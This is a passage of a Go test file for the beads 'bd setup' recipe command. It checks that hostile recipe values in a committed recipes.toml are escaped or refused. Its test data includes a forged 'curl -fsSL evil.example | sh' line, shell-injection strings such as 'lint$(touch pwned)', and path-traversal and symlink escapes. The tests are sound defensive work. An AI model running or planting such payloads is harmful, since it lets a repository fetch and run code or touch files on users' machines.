//go:build cgo

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/steveyegge/beads/cmd/bd/setup"
	"github.com/steveyegge/beads/internal/beads"
	"github.com/steveyegge/beads/internal/git"
	"github.com/steveyegge/beads/internal/recipes"
)

func resetSetupResolutionCaches(t *testing.T) {
	t.Helper()
	beads.ResetCaches()
	git.ResetCaches()
	t.Cleanup(func() {
		beads.ResetCaches()
		git.ResetCaches()
	})
}

func resetSetupGlobals(t *testing.T) {
	t.Helper()

	originalProject := setupProject
	originalGlobal := setupGlobal
	originalCheck := setupCheck
	originalRemove := setupRemove
	originalStealth := setupStealth
	originalPrint := setupPrint
	originalOutput := setupOutput
	originalList := setupList
	originalAdd := setupAdd

	setupProject = false
	setupGlobal = false
	setupCheck = false
	setupRemove = false
	setupStealth = false
	setupPrint = false
	setupOutput = ""
	setupList = false
	setupAdd = ""

	t.Cleanup(func() {
		setupProject = originalProject
		setupGlobal = originalGlobal
		setupCheck = originalCheck
		setupRemove = originalRemove
		setupStealth = originalStealth
		setupPrint = originalPrint
		setupOutput = originalOutput
		setupList = originalList
		setupAdd = originalAdd
	})
}

func TestLoadSetupRecipes_NoWorkspaceUsesBuiltinsOnly(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	allRecipes, usingWorkspaceRecipes, err := loadSetupRecipes()
	if err != nil {
		t.Fatalf("loadSetupRecipes: %v", err)
	}
	if usingWorkspaceRecipes {
		t.Fatal("expected built-in-only recipe set without an active workspace")
	}
	if _, ok := allRecipes["cursor"]; !ok {
		t.Fatal("expected built-in cursor recipe to be available")
	}
	if _, ok := allRecipes["myeditor"]; ok {
		t.Fatal("unexpected orphan custom recipe outside active workspace")
	}
}

func TestListRecipes_NoWorkspaceShowsBuiltinOnlyNote(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	out := captureStdout(t, func() error {
		listRecipes()
		return nil
	})

	if !strings.Contains(out, "cursor") {
		t.Fatalf("expected built-in recipes in output, got:\n%s", out)
	}
	if !strings.Contains(out, "copilot") {
		t.Fatalf("expected copilot recipe in output, got:\n%s", out)
	}
	if strings.Contains(out, "myeditor") {
		t.Fatalf("unexpected orphan custom recipe in output:\n%s", out)
	}
	if !strings.Contains(out, "Note: No active beads workspace found. Showing built-in recipes only.") {
		t.Fatalf("expected built-in-only note in output, got:\n%s", out)
	}
	if !strings.Contains(out, "Hint: "+diagHint()) {
		t.Fatalf("expected diagnostic hint in output, got:\n%s", out)
	}
}

func TestAddRecipe_NoWorkspaceReturnsActiveWorkspaceError(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	err := addRecipe("myeditor", ".myeditor/rules.md")
	if err == nil {
		t.Fatal("expected addRecipe to fail without active workspace")
	}
	if !strings.Contains(err.Error(), activeWorkspaceNotFoundError()) {
		t.Fatalf("expected active-workspace error, got: %v", err)
	}
	if !strings.Contains(err.Error(), diagHint()) {
		t.Fatalf("expected diagnostic hint, got: %v", err)
	}

	if _, statErr := os.Stat(filepath.Join(tmpDir, ".beads", "recipes.toml")); !os.IsNotExist(statErr) {
		t.Fatalf("expected no local recipes.toml, got err=%v", statErr)
	}
}

func TestLookupSetupRecipe_NoWorkspaceIgnoresOrphanCustomRecipes(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	_, err := lookupSetupRecipe("myeditor")
	if err == nil {
		t.Fatal("expected custom recipe lookup to fail without active workspace")
	}
	if !strings.Contains(err.Error(), "workspace-local custom recipes require an active beads workspace") {
		t.Fatalf("expected explicit no-workspace message, got: %v", err)
	}
}

func TestRunRecipe_BuiltinFileRecipeWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("windsurf")
		return nil
	})

	if !strings.Contains(out, "Installing Windsurf integration") {
		t.Fatalf("expected install output, got:\n%s", out)
	}

	installedPath := filepath.Join(tmpDir, ".windsurf", "rules", "beads.md")
	data, err := os.ReadFile(installedPath)
	if err != nil {
		t.Fatalf("ReadFile(%q): %v", installedPath, err)
	}
	if string(data) != recipes.Template {
		t.Fatalf("installed recipe contents did not match template")
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".beads")); !os.IsNotExist(err) {
		t.Fatalf("expected no local .beads directory to be created, got err=%v", err)
	}
}

func TestRunRecipe_KiroWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("kiro")
		return nil
	})

	if !strings.Contains(out, "Installing Kiro CLI integration") {
		t.Fatalf("expected install output, got:\n%s", out)
	}

	installedPath := filepath.Join(tmpDir, ".kiro", "steering", "beads.md")
	data, err := os.ReadFile(installedPath)
	if err != nil {
		t.Fatalf("ReadFile(%q): %v", installedPath, err)
	}
	if string(data) != recipes.Template {
		t.Fatalf("installed Kiro recipe contents did not match template")
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".beads")); !os.IsNotExist(err) {
		t.Fatalf("expected no local .beads directory to be created, got err=%v", err)
	}
}

func TestRunRecipe_CopilotWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("copilot")
		return nil
	})

	if !strings.Contains(out, "GitHub Copilot CLI integration installed") {
		t.Fatalf("expected copilot install output, got:\n%s", out)
	}

	if _, err := os.Stat(filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")); err != nil {
		t.Fatalf("expected copilot plugin manifest: %v", err)
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".github", "copilot-instructions.md")); err != nil {
		t.Fatalf("expected copilot instructions: %v", err)
	}
}

func TestRunRecipe_CopilotCheckWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	runRecipe("copilot")

	resetSetupGlobals(t)
	setupCheck = true

	out := captureStdout(t, func() error {
		runRecipe("copilot")
		return nil
	})

	if !strings.Contains(out, ".copilot-plugin/plugin.json") {
		t.Fatalf("expected plugin manifest in check output, got:\n%s", out)
	}
	if !strings.Contains(out, ".github/copilot-instructions.md") {
		t.Fatalf("expected instructions file in check output, got:\n%s", out)
	}
}

func TestRunRecipe_CopilotRemoveWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	runRecipe("copilot")

	resetSetupGlobals(t)
	setupRemove = true
	runRecipe("copilot")

	if _, err := os.Stat(filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")); !os.IsNotExist(err) {
		t.Fatalf("expected plugin manifest to be removed, got err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".github", "copilot-instructions.md")); !os.IsNotExist(err) {
		t.Fatalf("expected copilot instructions to be removed, got err=%v", err)
	}
}

// Remove takes a file recipe's files out and then removes the directory each
// was in if that left it empty, but it never removes one that is a symlink,
// since that unlinks it whatever its target holds: a team's shared
// .windsurf/rules, say, or a .github holding workflows.
func TestRunRecipe_RemoveKeepsDirItDidNotEmpty(t *testing.T) {
	rules := filepath.Join(".windsurf", "rules")
	for _, tt := range []struct {
		name   string
		recipe string
		dir    string // the directory holding the recipe's file
		file   string // the recipe's file
		link   bool   // dir is a symlink to a directory beside the workspace
		mine   bool   // dir holds a file of the user's too
		bare   bool   // bd setup did not run first; dir is one the user made
		kept   bool
	}{
		{name: "linked .windsurf/rules holding a rule of the user's", recipe: "windsurf", dir: rules, file: "beads.md", link: true, mine: true, kept: true},
		{name: "linked .windsurf/rules holding only bd's rule", recipe: "windsurf", dir: rules, file: "beads.md", link: true, kept: true},
		{name: "linked .github holding workflows", recipe: "copilot", dir: ".github", file: "copilot-instructions.md", link: true, mine: true, kept: true},
		{name: "real .windsurf/rules holding a rule of the user's", recipe: "windsurf", dir: rules, file: "beads.md", mine: true, kept: true},
		{name: "real .windsurf/rules holding only bd's rule", recipe: "windsurf", dir: rules, file: "beads.md"},
		{name: "real empty .windsurf/rules, nothing installed", recipe: "windsurf", dir: rules, file: "beads.md", bare: true, kept: true},
	} {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			ws := filepath.Join(root, "ws")
			dir := filepath.Join(ws, tt.dir)
			target := dir
			if tt.link {
				target = filepath.Join(root, "shared")
			}
			for _, d := range []string{target, filepath.Dir(dir)} {
				if err := os.MkdirAll(d, 0o755); err != nil {
					t.Fatal(err)
				}
			}
			if tt.link {
				if err := os.Symlink(target, dir); err != nil {
					t.Skipf("symlink: %v", err)
				}
			}
			mine := filepath.Join(target, "mine.md")
			if tt.mine {
				if err := os.WriteFile(mine, []byte("mine\n"), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			t.Chdir(ws)
			t.Setenv("BEADS_DIR", "")
			resetSetupResolutionCaches(t)
			if !tt.bare {
				resetSetupGlobals(t)
				if err := runRecipe(tt.recipe); err != nil {
					t.Fatalf("bd setup %s: %v", tt.recipe, err)
				}
			}

			resetSetupGlobals(t)
			setupRemove = true
			if err := runRecipe(tt.recipe); err != nil {
				t.Fatalf("bd setup %s --remove: %v", tt.recipe, err)
			}
			if _, err := os.Lstat(filepath.Join(target, tt.file)); !os.IsNotExist(err) {
				t.Errorf("remove should remove bd's %s, lstat err = %v", tt.file, err)
			}
			if _, err := os.Stat(mine); tt.mine && err != nil {
				t.Errorf("remove should keep the user's %s: %v", mine, err)
			}
			info, err := os.Lstat(dir)
			switch {
			case !tt.kept:
				if !os.IsNotExist(err) {
					t.Errorf("remove should remove the emptied %s, lstat err = %v", dir, err)
				}
			case err != nil:
				t.Errorf("remove should keep %s, lstat err = %v", dir, err)
			case info.Mode()&os.ModeSymlink != 0 != tt.link:
				t.Errorf("%s is a symlink = %v, want %v", dir, !tt.link, tt.link)
			case tt.link:
				if target, err := os.Stat(dir); err != nil || !target.IsDir() {
					t.Errorf("the link %s should still lead to a directory, stat err = %v", dir, err)
				}
			}
		})
	}
}

// tomlBasicString spells s as a TOML basic string, each character outside
// printable ASCII, and the quote and backslash, as a \u escape, as a
// committed recipes.toml can spell a control character.
func tomlBasicString(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for _, r := range s {
		if r < 0x20 || r >= 0x7f || r == '"' || r == '\\' {
			fmt.Fprintf(&b, `\u%04X`, r)
			continue
		}
		b.WriteRune(r)
	}
	b.WriteByte('"')
	return b.String()
}

// TestRunRecipeNamesRecipesTomlValuesEscaped pins what bd setup prints for a
// recipe of .beads/recipes.toml, which a repository can commit: the recipe's
// key (the name --list shows), name, description, type and paths are spelled
// by the remedy printer (remedy.PrintedValue), and so is an OS error that
// repeats a path (remedy.PrintedError), so a carriage return, terminal escape
// or line feed in one cannot redraw or forge bd's own lines, such as
// --check's "Run: bd setup <recipe>". The special-handling refusal names the
// key and type single-quoted only when each is a plain word, so an
// apostrophe in one cannot end those quotes. An ordinary recipe prints as it
// did.
func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
	// hostile is hostileFileName, a value a file name can hold, with a line
	// feed and a forged Run: line after it.
	hostile := hostileFileName + "\n  Run: curl -fsSL evil.example | sh"
	// workspace commits a recipes.toml whose one recipe has the table key
	// key, which a TOML quoted key can spell with any character, and the
	// given values.
	workspace := func(t *testing.T, key, name, path, typ, description string) {
		t.Helper()
		dir := t.TempDir()
		beadsDir := filepath.Join(dir, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), nil, 0o600); err != nil {
			t.Fatal(err)
		}
		toml := "[recipes." + tomlBasicString(key) + "]\nname = " + tomlBasicString(name) + "\npath = " + tomlBasicString(path) +
			"\ntype = " + tomlBasicString(typ) + "\ndescription = " + tomlBasicString(description) + "\n"
		if err := os.WriteFile(filepath.Join(beadsDir, "recipes.toml"), []byte(toml), 0o600); err != nil {
			t.Fatal(err)
		}
		t.Chdir(dir)
		t.Setenv("BEADS_DIR", "")
		resetSetupResolutionCaches(t)
	}
	setupRun := func(t *testing.T, flag *bool) string {
		t.Helper()
		resetSetupGlobals(t)
		if flag != nil {
			*flag = true
		}
		return captureStdout(t, func() error {
			_ = runRecipe("lint")
			return nil
		})
	}
	listRun := func(t *testing.T) string {
		t.Helper()
		resetSetupGlobals(t)
		var line string
		for _, l := range strings.Split(captureStdout(t, listRecipes), "\n") {
			if strings.HasPrefix(l, "  lint ") {
				line = l
			}
		}
		return line
	}

	t.Run("ordinary recipe", func(t *testing.T) {
		workspace(t, "lint", "Lint", "tools/lint.md", "file", "Lint rules")
		for _, step := range []struct {
			name string
			out  func(t *testing.T) string
			want string
		}{
			{"--list", listRun, "  lint          Lint rules                 (user)"},
			{"--check, not installed", func(t *testing.T) string { return setupRun(t, &setupCheck) },
				"✗ Lint integration not installed\n  Run: bd setup lint\n  Missing: tools/lint.md\n"},
			{"install", func(t *testing.T) string { return setupRun(t, nil) },
				"Installing Lint integration...\n\n✓ Lint integration installed\n  File: tools/lint.md\n"},
			{"--check, installed", func(t *testing.T) string { return setupRun(t, &setupCheck) },
				"✓ Lint integration installed\n  File: tools/lint.md\n"},
			{"--remove", func(t *testing.T) string { return setupRun(t, &setupRemove) }, "✓ Removed Lint integration\n"},
		} {
			if got := step.out(t); got != step.want {
				t.Errorf("bd setup %s printed\n%q\nwant\n%q", step.name, got, step.want)
			}
		}
	})

	t.Run("hostile recipe", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("a Windows file name cannot hold a control character")
		}
		workspace(t, "lint", hostile, filepath.Join("tools", hostile), "file", hostile)
		for _, step := range []struct {
			name string
			out  func(t *testing.T) string
		}{
			{"--list", listRun},
			{"--check, not installed", func(t *testing.T) string { return setupRun(t, &setupCheck) }},
			{"install", func(t *testing.T) string { return setupRun(t, nil) }},
			{"--check, installed", func(t *testing.T) string { return setupRun(t, &setupCheck) }},
			{"--remove", func(t *testing.T) string { return setupRun(t, &setupRemove) }},
		} {
			out := step.out(t)
			what := "bd setup lint " + step.name
			requireNoTerminalControl(t, what, out)
			requireNamesHostileValue(t, what, out)
			if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
				t.Errorf("%s does not escape the recipe value's line feed:\n%q", what, out)
			}
			if step.name == "--check, not installed" && !strings.Contains(out, "\n  Run: bd setup lint\n") {
				t.Errorf("%s does not print bd's own Run: line:\n%q", what, out)
			}
		}
	})

	t.Run("hostile recipe key", func(t *testing.T) {
		// --list names each recipe by its key, so the whole list is
		// checked, not the lint line listRun picks.
		workspace(t, hostile, "Lint", "tools/lint.md", "file", "Lint rules")
		resetSetupGlobals(t)
		out := captureStdout(t, listRecipes)
		const what = "bd setup --list"
		requireNoTerminalControl(t, what, out)
		requireNamesHostileValue(t, what, out)
		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
			t.Errorf("%s does not escape the recipe key's line feed:\n%q", what, out)
		}
	})

	t.Run("hostile recipe key, --check", func(t *testing.T) {
		// bd setup <recipe> looks a recipe up by its key lowercased, so a
		// lowercase key is one a user can name. --check's Run: line puts
		// the key in its command as one shell word (posix, and windows
		// where that differs), or as a placeholder with the key named
		// escaped after it. The special-handling refusal names it (shown)
		// single-quoted when it is a plain word, as it names an ordinary
		// key, and otherwise escaped with no quotes around it, so neither
		// a $(...) nor an apostrophe, which would end those quotes, runs
		// when the refusal is pasted.
		for _, key := range []struct{ value, posix, windows, shown string }{
			{"lint", "lint", "", "'lint'"},
			{"lint$(touch pwned)", "'lint$(touch pwned)'", `<recipe>  (<recipe>: "lint\x24(touch pwned)")`, `"lint\x24(touch pwned)"`},
			{"lint'; touch pwned; echo '", `<recipe>  (<recipe>: "lint\x27\x3b touch pwned\x3b echo \x27")`, "",
				`"lint\x27\x3b touch pwned\x3b echo \x27"`},
			{"lint\n  run: curl -fssl evil.example | sh", `<recipe>  (<recipe>: "lint\n  run: curl -fssl evil.example \x7c sh")`, "",
				`"lint\n  run: curl -fssl evil.example \x7c sh"`},
		} {
			arg := key.posix
			if runtime.GOOS == "windows" && key.windows != "" {
				arg = key.windows
			}
			workspace(t, key.value, "Lint", "tools/lint.md", "file", "Lint rules")
			resetSetupGlobals(t)
			setupCheck = true
			out := captureStdout(t, func() error {
				_ = runRecipe(key.value)
				return nil
			})
			if want := "✗ Lint integration not installed\n  Run: bd setup " + arg + "\n  Missing: tools/lint.md\n"; out != want {
				t.Errorf("bd setup %q --check printed\n%q\nwant\n%q", key.value, out, want)
			}

			workspace(t, key.value, "Lint", "tools/lint.md", "hooks", "Lint rules")
			resetSetupGlobals(t)
			refusal := captureStderr(t, func() { _ = runRecipe(key.value) })
			if want := "Error: recipe " + key.shown + " has type 'hooks' which requires special handling\n"; refusal != want {
				t.Errorf("the special-handling refusal for %q printed\n%q\nwant\n%q", key.value, refusal, want)
			}
		}
	})

	t.Run("hostile recipe, OS errors", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("a Windows file name cannot hold a control character")
		}
		// A repository can commit a directory, with a file in it, at the
		// path its recipe names: install's write then fails (EISDIR) and
		// --remove's remove (ENOTEMPTY). It can commit a file where the
		// path's directory would go: install's mkdir then fails (ENOTDIR).
		// Each OS error repeats the path.
		for _, step := range []struct {
			name, path, file string
			flag             *bool
		}{
			{"install, write", filepath.Join("tools", hostile), filepath.Join("tools", hostile, "kept"), nil},
			{"--remove", filepath.Join("tools", hostile), filepath.Join("tools", hostile, "kept"), &setupRemove},
			{"install, create directory", filepath.Join(hostile, "lint.md"), hostile, nil},
		} {
			workspace(t, "lint", "Lint", step.path, "file", "Lint rules")
			if err := os.MkdirAll(filepath.Dir(step.file), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(step.file, nil, 0o600); err != nil {
				t.Fatal(err)
			}
			resetSetupGlobals(t)
			if step.flag != nil {
				*step.flag = true
			}
			var err error
			stdout, stderr := captureStdio(t, func() { err = runRecipe("lint") })
			what := "bd setup lint " + step.name
			if err == nil {
				t.Errorf("%s succeeded; want it to fail on the committed %s", what, step.file)
			}
			requireNoTerminalControl(t, what, stdout+stderr)
			requireNamesHostileValue(t, what, stderr)
			if strings.Contains(stderr, "\n  Run: curl") || !strings.Contains(stderr, `\n  Run: curl`) {
				t.Errorf("%s does not escape the recipe path's line feed in its error:\n%q", what, stderr)
			}
		}
	})

	t.Run("hostile path outside the directory", func(t *testing.T) {
		// The refusal of a path outside the directory bd setup runs in
		// names the key and the path as the special-handling refusal names
		// the key and type: a path that is not a plain word is escaped.
		path := ".." + string(filepath.Separator) + hostile
		for _, step := range []struct {
			name string
			flag *bool
		}{{"install", nil}, {"--check", &setupCheck}, {"--remove", &setupRemove}} {
			workspace(t, "lint", "Lint", path, "file", "Lint rules")
			resetSetupGlobals(t)
			if step.flag != nil {
				*step.flag = true
			}
			var err error
			stdout, stderr := captureStdio(t, func() { err = runRecipe("lint") })
			what := "bd setup lint " + step.name
			if err == nil || stdout != "" {
				t.Errorf("%s: err %v, stdout %q; want a refusal", what, err, stdout)
			}
			requireNoTerminalControl(t, what, stderr)
			requireNamesHostileValue(t, what, stderr)
			if want := "Error: recipe 'lint' names " + recipeRefusalWord(path) + ", which is not inside the directory bd setup runs in\n"; !strings.HasPrefix(stderr, want) {
				t.Errorf("%s printed\n%q\nwant it to start with\n%q", what, stderr, want)
			}
		}
	})

	t.Run("hostile type", func(t *testing.T) {
		workspace(t, "lint", "Lint", "tools/lint.md", hostile, "Lint rules")
		resetSetupGlobals(t)
		setupCheck = true
		out := captureStderr(t, func() { _ = runRecipe("lint") })
		requireNoTerminalControl(t, "bd setup lint --check, special-handling refusal", out)
		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
			t.Errorf("the special-handling refusal does not escape the recipe type's line feed:\n%q", out)
		}

		// An apostrophe in the type would end the single quotes an ordinary
		// type is named in, so the type is named escaped instead.
		workspace(t, "lint", "Lint", "tools/lint.md", "hooks'; touch pwned; echo '", "Lint rules")
		resetSetupGlobals(t)
		out = captureStderr(t, func() { _ = runRecipe("lint") })
		if want := `Error: recipe 'lint' has type "hooks\x27\x3b touch pwned\x3b echo \x27" which requires special handling` + "\n"; out != want {
			t.Errorf("the special-handling refusal for a type holding an apostrophe printed\n%q\nwant\n%q", out, want)
		}
	})
}

// TestRunRecipe_WorkspaceRecipePathsStayInside pins that bd setup refuses a
// recipe of .beads/recipes.toml, which a repository can commit, when a path
// it names is not inside the directory bd setup runs in
// (recipes.PathInside): an absolute path, one that leaves the directory
// through .., or one that leads out of it through a symbolic link (a linked
// directory, a linked file, a .. after a linked directory, or a directory
// install would create or --remove would drop), and one that runs through a
// link bd setup cannot follow (a dangling one). The refusal comes before
// --check reads, install writes or --remove deletes any of the recipe's
// files or directories, a multifile recipe's inside paths included, and
// names the key and the path. A custom recipe and one overriding a built-in are refused
// alike. An ordinary recipe, one whose path runs through a link inside the
// directory, and a built-in recipe run as before.
func TestRunRecipe_WorkspaceRecipePathsStayInside(t *testing.T) {
	// workspace makes base/ws a workspace whose recipes.toml is toml, with
	// the links given, base/outside/victim.md beside it and ws/sub/kept.md
	// and ws/sub/deep/ in it, and runs bd setup in ws.
	workspace := func(t *testing.T, toml string, links map[string]string) (ws, outside string) {
		t.Helper()
		base := t.TempDir()
		ws, outside = filepath.Join(base, "ws"), filepath.Join(base, "outside")
		for _, d := range []string{filepath.Join(ws, ".beads"), filepath.Join(ws, "sub", "deep"), outside} {
			if err := os.MkdirAll(d, 0o750); err != nil {
				t.Fatal(err)
			}
		}
		for path, data := range map[string]string{
			filepath.Join(ws, ".beads", "config.yaml"):  "",
			filepath.Join(ws, ".beads", "recipes.toml"): toml,
			filepath.Join(ws, "sub", "kept.md"):         "kept\n",
			filepath.Join(outside, "victim.md"):         "victim\n",
		} {
			if err := os.WriteFile(path, []byte(data), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		for link, target := range links {
			if err := os.Symlink(filepath.FromSlash(target), filepath.Join(ws, filepath.FromSlash(link))); err != nil {
				t.Skipf("symlink: %v", err)
			}
		}
		t.Chdir(ws)
		t.Setenv("BEADS_DIR", "")
		resetSetupResolutionCaches(t)
		return ws, outside
	}
	modes := []struct {
		name string
		flag *bool
	}{{"install", nil}, {"--check", &setupCheck}, {"--remove", &setupRemove}}
	// listing names every entry under dir, so a test sees one created or
	// removed there.
	listing := func(t *testing.T, dir string) []string {
		t.Helper()
		var names []string
		if err := filepath.WalkDir(dir, func(path string, _ os.DirEntry, err error) error {
			names = append(names, path)
			return err
		}); err != nil {
			t.Fatal(err)
		}
		return names
	}
	const outsideWhy = "is not inside the directory bd setup runs in"

	for _, tt := range []struct {
		name, recipe string
		toml         func(outside string) string
		links        map[string]string
		named        func(outside string) string // the path the refusal names
		why          string                      // why it is refused; outsideWhy if empty
		prepare      func(t *testing.T, ws, outside string)
	}{
		{
			name: "custom recipe, absolute path", recipe: "lint",
			toml: func(o string) string {
				return "[recipes.lint]\npath = " + tomlBasicString(filepath.Join(o, "victim.md")) + "\n"
			},
			named: func(o string) string { return filepath.Join(o, "victim.md") },
		},
		{
			name: "windsurf override, .. path", recipe: "windsurf",
			toml: func(string) string {
				return "[recipes.windsurf]\npath = " + tomlBasicString(filepath.Join("..", "outside", "victim.md")) + "\n"
			},
			named: func(string) string { return filepath.Join("..", "outside", "victim.md") },
		},
		{
			name: "kiro override, linked directory", recipe: "kiro",
			toml:  func(string) string { return "[recipes.kiro]\npath = \"up/outside/victim.md\"\n" },
			links: map[string]string{"up": ".."},
			named: func(string) string { return "up/outside/victim.md" },
		},
		{
			// The OS takes .. after a linked directory to the parent of the
			// link's target, not of the link: o/../outside/victim.md, which
			// cleans to a name inside, is the outside victim.md.
			name: "kiro override, .. after a linked directory", recipe: "kiro",
			toml:  func(string) string { return "[recipes.kiro]\npath = \"o/../outside/victim.md\"\n" },
			links: map[string]string{"o": "../outside"},
			named: func(string) string { return "o/../outside/victim.md" },
		},
		{
			name: "cody override, linked file", recipe: "cody",
			toml:  func(string) string { return "[recipes.cody]\npath = \"sub/beads.md\"\n" },
			links: map[string]string{"sub/beads.md": "../../outside/victim.md"},
			named: func(string) string { return "sub/beads.md" },
		},
		{
			// Windows cleans .. away before it follows links, so it opens
			// x/../sub/beads.md as sub/beads.md, the linked file.
			name: "cody override, cleaned path a linked file", recipe: "cody",
			toml:  func(string) string { return "[recipes.cody]\npath = \"x/../sub/beads.md\"\n" },
			links: map[string]string{"x": "sub/deep", "sub/beads.md": "../../outside/victim.md"},
			named: func(string) string { return "x/../sub/beads.md" },
		},
		{
			name: "kilocode override, dangling link", recipe: "kilocode",
			toml:  func(string) string { return "[recipes.kilocode]\npath = \"sub/beads.md\"\n" },
			links: map[string]string{"sub/beads.md": "../../outside/new.md"},
			named: func(string) string { return "sub/beads.md" },
			why:   "runs through a symbolic link bd setup cannot follow",
		},
		{
			// The OS walks x/../up/outside/empty/beads.md to
			// sub/up/outside/empty/beads.md, inside, but the directory
			// install creates and --remove drops when empty is
			// filepath.Dir of the path, up/outside/empty: the outside
			// empty/ directory.
			name: "kiro override, directory leading out", recipe: "kiro",
			toml:  func(string) string { return "[recipes.kiro]\npath = \"x/../up/outside/empty/beads.md\"\n" },
			links: map[string]string{"x": "sub/deep", "up": ".."},
			named: func(string) string { return "x/../up/outside/empty/beads.md" },
			prepare: func(t *testing.T, ws, outside string) {
				// --remove has a file to remove inside, and an empty
				// directory outside that removing it would leave empty.
				for _, d := range []string{filepath.Join(ws, "sub", "up", "outside", "empty"), filepath.Join(outside, "empty")} {
					if err := os.MkdirAll(d, 0o750); err != nil {
						t.Fatal(err)
					}
				}
				if err := os.WriteFile(filepath.Join(ws, "sub", "up", "outside", "empty", "beads.md"), nil, 0o600); err != nil {
					t.Fatal(err)
				}
			},
		},
		{
			name: "kiro override, directory install would create outside", recipe: "kiro",
			toml:  func(string) string { return "[recipes.kiro]\npath = \"x/../up/outside/newdir/beads.md\"\n" },
			links: map[string]string{"x": "sub/deep", "up": ".."},
			named: func(string) string { return "x/../up/outside/newdir/beads.md" },
		},
		{
			name: "copilot override, multifile", recipe: "copilot",
			toml: func(string) string {
				return "[recipes.copilot]\ntype = \"multifile\"\npaths = [\"sub/kept.md\", " + tomlBasicString(filepath.Join("..", "outside", "victim.md")) + "]\n"
			},
			named: func(string) string { return filepath.Join("..", "outside", "victim.md") },
		},
	} {
		for _, mode := range modes {
			t.Run(tt.name+" "+mode.name, func(t *testing.T) {
				ws, outside := workspace(t, "", tt.links)
				if err := os.WriteFile(filepath.Join(ws, ".beads", "recipes.toml"), []byte(tt.toml(outside)), 0o600); err != nil {
					t.Fatal(err)
				}
				if tt.prepare != nil {
					tt.prepare(t, ws, outside)
				}
				before := listing(t, outside)
				resetSetupGlobals(t)
				if mode.flag != nil {
					*mode.flag = true
				}
				var err error
				stdout, stderr := captureStdio(t, func() { err = runRecipe(tt.recipe) })
				what := "bd setup " + tt.recipe + " " + mode.name
				if err == nil {
					t.Errorf("%s succeeded; want a refusal", what)
				}
				why := tt.why
				if why == "" {
					why = outsideWhy
				}
				want := "Error: recipe '" + tt.recipe + "' names " + recipeRefusalWord(tt.named(outside)) +
					", which " + why + "\n" +
					"Hint: a .beads/recipes.toml recipe can only name a relative path with no '..' or symbolic link leading out of the directory bd setup runs in, and no dangling or looping link along it\n"
				if stdout != "" || stderr != want {
					t.Errorf("%s printed\nstdout %q\nstderr %q\nwant stderr %q", what, stdout, stderr, want)
				}
				for path, data := range map[string]string{
					filepath.Join(outside, "victim.md"): "victim\n",
					filepath.Join(ws, "sub", "kept.md"): "kept\n",
				} {
					if got, err := os.ReadFile(path); err != nil || string(got) != data {
						t.Errorf("%s changed %s: %q, %v", what, path, got, err)
					}
				}
				if after := listing(t, outside); !slices.Equal(after, before) {
					t.Errorf("%s changed %s: entries %q, were %q", what, outside, after, before)
				}
			})
		}
	}

	t.Run("ordinary recipes run as before", func(t *testing.T) {
		for _, tt := range []struct {
			name, recipe, toml, file string
			links                    map[string]string
		}{
			{name: "custom recipe", recipe: "lint", toml: "[recipes.lint]\npath = \"tools/lint.md\"\n", file: "tools/lint.md"},
